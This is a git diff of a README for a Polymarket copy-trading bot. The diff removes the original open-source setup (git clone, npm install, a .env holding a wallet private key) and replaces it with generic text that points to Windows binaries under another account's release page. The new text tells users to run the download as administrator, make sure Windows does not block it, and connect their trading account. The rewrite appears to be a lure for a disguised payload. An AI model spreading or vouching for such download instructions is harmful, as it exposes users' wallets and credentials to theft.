@@ -1,85 +1,159 @@
-# Polymarket Copy trading Bot
+# 🤖 polymarket-copy-trading-bot - Follow Trades With Less Effort
 
-Polymarket Copytrading Bot which copies trades from one or more leader addresses on Polymarket. Config in `trade.toml`, secrets in `.env`.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/UnitedStars111/polymarket-copy-trading-bot/releases)
 
-## Journey of Builder - Gustavo1900
+## 🚀 Getting Started
 
-While many traders focus heavily on crypto prediction markets, I noticed that they can be extremely volatile and unpredictable in short timeframes. Rapid price swings, aggressive position flipping, and sudden liquidity shifts make consistent automation difficult.
+polymarket-copy-trading-bot is a Windows app that helps you copy trading activity on Polymarket. It is built for users who want a simple way to keep track of trades and act on them from one place.
 
-When I started looking at Polymarket, I noticed one thing right away: markets can be unpredictable. Crypto markets, in particular, move fast—prices swing, positions flip, and liquidity can change in an instant, making consistent automation really tricky.
+Use the release page to get the app for Windows:
 
-Instead of limiting the bot to one type of market, I decided to build a system that could copy trades across all kinds of markets—Politics, Sports, Crypto, Economic events, and more. The idea was simple: follow experienced traders, act quickly, and stay flexible, no matter what market they’re in.
+[Visit the release page to download](https://github.com/UnitedStars111/polymarket-copy-trading-bot/releases)
 
-I started development in early February 2026, spending a couple of weeks testing, refining filters, timing logic, and position sizes. Running simulations on historical data and testing with a small live balance showed promising results: steady, consistent gains without chasing extreme volatility.
+## 📥 Download and Install
 
-The strategy isn’t about explosive wins. It’s about disciplined copy trading, spreading risk across multiple markets, and aiming for smooth, reliable performance. By following multiple leaders and diversifying trades, the bot can handle fast-moving markets like sports and crypto while still keeping long-term events, like politics and macroeconomics, in play.
+1. Open the [release page](https://github.com/UnitedStars111/polymarket-copy-trading-bot/releases).
+2. Find the latest version at the top of the page.
+3. Look for a Windows file, such as `.exe` or `.zip`.
+4. Download the file to your computer.
+5. If you downloaded a `.zip` file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
 
-In short, it’s a long-term, flexible system built for steady growth, smart risk control, and automated trading across the full spectrum of Polymarket.
-This is a long-term strategy — built around discipline, diversification, and steady growth rather than hype.
+If Windows asks for permission, choose Yes or Run.
 
-# Market Types
+## 🖥️ Windows Setup
 
-- Polymarket includes Politics, Sports, Crypto, Economic, Geopolitical, Entertainment, and Experimental markets.
-- Politics & Macro markets are longer-term and news-driven, suitable for medium-term copy strategies.
-- Sports & Crypto markets are fast-moving and require quick execution (websocket mode recommended).
-- Entertainment markets tend to be slower and lower volatility.
-- Experimental / low-liquidity markets carry higher slippage risk and should use size limits.
+Use this app on a Windows 10 or Windows 11 PC.
 
-Adjust filters like entry_trade_sec, trade_sec_from_resolve, take_profit, and buy_amount_limit_in_usd based on the market’s volatility and duration.
+Before you start:
 
-## Setup
+- Make sure you have a stable internet connection
+- Keep enough free disk space for the app and its files
+- Use a computer where you can save files and open downloaded apps
+- Close extra apps if your system runs slow
 
-```bash
-git clone https://github.com/Gustavo1900/polymarket-copy-trading-bot.git
-cd polymarket-copy-trading-bot
-npm install
-# Edit .env: WALLET_PRIVATE_KEY, PROXY_WALLET_ADDRESS (if Magic), SIGNATURE_TYPE
-cd frontend
-npm install
-# Install for UI
-cd ..
-npm run dev
-```
+If the app opens in a browser window or desktop window, leave it open while you use it.
 
-# Advanced Polymarket Trading Bot.
+## 🧭 What the App Does
 
-I have developed an advanced Polymarket trading bot, including a high-performance Rust-based copy trading system optimized for low-latency execution, as well as an AI agent trading bot built in TypeScript with automated strategy logic. 
+This app is meant to help you with Polymarket copy trading tasks. It can be used to:
 
-The architecture is designed for speed, efficiency, and scalability, making it suitable for serious traders looking to automate and optimize their activity in prediction markets. If you are interested in purchasing or learning more about the system and its capabilities, feel free to contact me directly.
+- Watch selected market activity
+- Copy trade actions from a source you trust
+- Keep your trading flow in one place
+- Reduce the need to check everything by hand
+- Make repeat steps easier to manage
 
-<img width="1884" height="617" alt="image" src="https://github.com/user-attachments/assets/900d2bb1-de25-4d4c-a94d-7f083990e145" />
+The app focuses on a simple process so you can get started without learning a new system.
 
-## Run
+## 🛠️ How to Start Using It
 
-```bash
-npm run dev    # tsx src/index.ts
-```
+1. Open the app after you install it.
+2. Sign in if the app asks for account access.
+3. Set up your Polymarket connection if needed.
+4. Choose the trader, market, or source you want to follow.
+5. Pick your trade size and other basic settings.
+6. Save your setup.
+7. Start the copy process.
 
-## Env
+If the app has a settings page, keep your first setup simple. You can change it later after you see how it works.
 
-- `WALLET_PRIVATE_KEY` – EOA or Magic export
-- `PROXY_WALLET_ADDRESS` – Polymarket profile (required for Magic; optional EOA)
-- `SIGNATURE_TYPE` – 0 = EOA, 1 = Magic/proxy, 2 = Gnosis Safe
+## ⚙️ Main Features
 
-## Contact
-For the best version contact here: [Telegram](https://t.me/snipmaxi)
+- Copy trade actions from a chosen source
+- Simple Windows-friendly interface
+- Basic trade control settings
+- Market tracking tools
+- Clear start and stop controls
+- Fast access to common actions
+- Layout made for non-technical users
 
-### Target Wallets
+## 📌 Typical Use Case
 
-|Address|Profile|Pnl|
-|-|-|-|
-|0x6031b6eed1c97e853c6e0f03ad3ce3529351f96d|@gabagool22|<img width="1200" src="https://github.com/user-attachments/assets/ef04d657-da3f-4b5a-aeed-b99f2c264df8" />|
-|0x63ce342161250d705dc0b16df89036c8e5f9ba9a|@0x8dxd|<img width="1200" src="https://github.com/user-attachments/assets/e032f4e9-001a-4dd6-b3b5-6d983167f92d" />|
-|0xa61ef8773ec2e821962306ca87d4b57e39ff0abd|@risk-manager|<img width="1200" src="https://github.com/user-attachments/assets/6ca49607-7615-4a0c-9786-54400971ee27" />|
-|0x781a48229e2c08e20d1eaad90ef73710988c96e6|@100USDollars|<img width="1200" src="https://github.com/user-attachments/assets/380debcb-dc09-466f-b7cd-ca2552605eb7" />|
-|0x0ac97e4f5c542cd98c226ae8e1736ae78b489641|@7thStaircase|<img width="1200" src="https://github.com/user-attachments/assets/c638d830-a472-4035-99ca-c33c72c3aa23" />|
-|0x1d0034134e339a309700ff2d34e99fa2d48b0313|@0x1d0034134e|<img width="1200" src="https://github.com/user-attachments/assets/2e07c2bf-2ac6-42d2-b319-356bfc0def91" />|
-|0xa9878e59934ab507f9039bcb917c1bae0451141d|@ilovecircle|<img width="1200" src="https://github.com/user-attachments/assets/b8342802-62d3-461d-8593-8f980178bdfe" />|
-|0xd0d6053c3c37e727402d84c14069780d360993aa|@k9Q2mX4L8A7ZP3R|<img width="1200" src="https://github.com/user-attachments/assets/e3eaf5bb-b6d3-47fd-bf96-93d13bcd4442" />|
-|0x594edB9112f526Fa6A80b8F858A6379C8A2c1C11|@0x594...1C11|<img width="1200" src="https://github.com/user-attachments/assets/d868f76d-74d9-405d-b168-7e8d5b27c083" />|
-|0x1979ae6B7E6534dE9c4539D0c205E582cA637C9D|@0x197...7C9D|<img width="1200" src="https://github.com/user-attachments/assets/45d5c5cd-e9b2-492f-ad9d-94c2d9bf1fac" />|
-|0x4460bf2c0aa59db412a6493c2c08970797b62970|@Bidou28old|<img width="1200" src="https://github.com/user-attachments/assets/9ff95df6-ff16-48ea-82d4-979d358f973d" />|
-|0x0eA574F3204C5c9C0cdEad90392ea0990F4D17e4|@0x0eA...17e4|<img width="1200" src="https://github.com/user-attachments/assets/e5162217-c7b8-4656-8858-e82c93ca36e8" />|
-|0x118689b24aead1d6e9507b8068d056b2ec4f051b|@russell110320|<img width="1200" src="https://github.com/user-attachments/assets/b508aa98-80a7-4a1f-8bf4-c4e097dc6105" />|
-|0x13414a77a4be48988851c73dfd824d0168e70853|@czoyimsezblaznili|<img width="1200" src="https://github.com/user-attachments/assets/eb1c7041-29b1-4a21-803f-59bbe8dc0a4b" />|
+A user wants to follow a trader on Polymarket without checking every move by hand.
 
+With this app, the user can:
+
+- Open the app
+- Choose the trader to follow
+- Set a limit for each trade
+- Start the copy process
+- Watch the activity from the app window
+
+This keeps the workflow direct and easy to manage.
+
+## 🔐 Account and Safety Tips
+
+Use care with any trading app.
+
+- Only use accounts you control
+- Check your settings before you start
+- Review trade size limits
+- Keep your login details private
+- Use the app on a trusted Windows device
+- Test with small amounts first if you are new to the process
+
+## 🧩 File Types You May See
+
+The release page may include one of these files:
+
+- `.exe` — double-click to run
+- `.zip` — extract first, then run the app
+- `.msi` — run the installer and follow the steps
+
+If you are not sure which file to use, choose the Windows file that matches your computer.
+
+## 🧑‍💻 Simple Troubleshooting
+
+If the app does not open:
+
+- Try running it again
+- Right-click the file and choose Run as administrator
+- Make sure Windows did not block the file
+- Re-download the file from the release page
+- Check that you extracted all files if you used a `.zip`
+
+If the app opens but does not work as expected:
+
+- Check your internet connection
+- Confirm your settings
+- Make sure you selected the right source or market
+- Close the app and open it again
+
+## 📂 Suggested Folder Layout
+
+If you use the app from a ZIP file, keep the files in one folder like this:
+
+- `polymarket-copy-trading-bot`
+  - app files
+  - settings files
+  - logs
+  - support files
+
+Do not move files around after setup unless you know they are not needed by the app.
+
+## 🔄 Basic Workflow
+
+1. Download the app from the release page
+2. Install or extract it
+3. Open the app
+4. Connect your account
+5. Choose your trading source
+6. Set trade limits
+7. Start copy trading
+8. Review the activity
+
+## 🏷️ Topics
+
+bot, copy, polymarket, trading
+
+## 📎 Project Name
+
+polymarket-copy-trading-bot
+
+## 📦 Release Page
+
+Use this page to download and run the Windows version:
+
+https://github.com/UnitedStars111/polymarket-copy-trading-bot/releases
